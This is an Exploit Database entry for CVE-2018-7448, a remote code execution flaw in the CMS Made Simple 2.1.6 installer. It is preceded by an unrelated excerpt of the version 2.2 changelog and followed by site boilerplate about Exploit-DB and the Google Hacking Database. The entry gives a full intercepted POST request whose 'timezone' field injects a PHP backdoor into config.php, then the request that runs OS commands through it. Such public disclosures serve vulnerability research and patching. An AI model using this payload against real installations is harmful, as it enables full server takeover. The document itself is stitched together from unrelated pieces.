Version 2.2 - Canada
----------------------------------
Core - General
 - Automatically turn on file locking for cached files to attempt to mitigate race conditions.
 NOTE: On systems using archaic filesystems such as FAT and FAT32 CMSMS may no longer operate.
 - cms\_filecache\_driver now caches for 2 hours by default and has an improved cooperative locking test
 - Implement new database abstraction library that is compatible with (functionality wise) but improves upon adodb-lite.
 - Implement protocol-less URL's in the config.
 - Page tabs are now focusable (you can tab through page tabs and use enter to select one).
 - Minor fix to the {form\_start} plugin.
 - Minor change to the {admin\_icon} plugin (default image class).
 - Cache more items that are queried from the database, to reduce mysql load.

# Exploit Title: CMS Made Simple 2.1.6 - Remote Code Execution
# Date: 2018-02-26
# Exploit Author: Keerati T.
# Vendor Homepage: http://www.cmsmadesimple.org/
# Software Link: http://s3.amazonaws.com/cmsms/downloads/13570/cmsms-2.
1.6-install.zip
# Version: 2.1.6
# CVE: CVE-2018-7448
# Tested on: Linux

1.Description
Arbitrary PHP code can be injected into configuration file (config.php) after installation has been finished. In order to inject PHP code, fresh install and valid database credentials is required. Application will force an installer (usually "www-data" due to web-based installation) to set a write permission (777) to destination directory and related installation file. An attacker will proceed installation process until reach step 4 and inject malicious PHP code into "timezone" parameter. Once PHP code has been injected to "config.php", an attacker will be able to execute OS command by accessing backdoor "config.php" file along with injected parameter which contain OS command value.

2.Proof of Concept
- Access to "http://target/path/cmsms-2.1.6-install.php" for installing CMS Made Simple
- Proceed to step 4 of installation which is database setup stage, enter a valid database credentials and modifying "timezone" parameter on intercepted proxy as following:

==========
POST /cms/cmsms-2.1.6-install.php/index.php?mdf68c24c=4 HTTP/1.1
Host: 192.168.5.196
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.5.196/cms/cmsms-2.1.6-install.php/index.
php?mdf68c24c=4
Cookie: CMSICc861538bbb=i549m59qpme0u9klupbkb68me4
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 126

dbhost=localhost&dbname=cms&dbuser=xvwa&dbpass=xvwa&
timezone=junk';echo%20system($_GET['cmd']);$junk='junk&next=Next+%E2%86%92
==========

- Forward tampered "timezone" parameter packet and proceed to next step until successfully installation.
- Execute OS command via "config.php" by requesting " http://target/path/config.php?cmd=id;uname"

3.Timeline
2017-04-14 Vulnerability report
2017-04-15 Vendor inform that will be fixed on next full release
2017-06-10 Version 2.2 release and vulnerability fixed
2018-02-23 CVE assigned

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
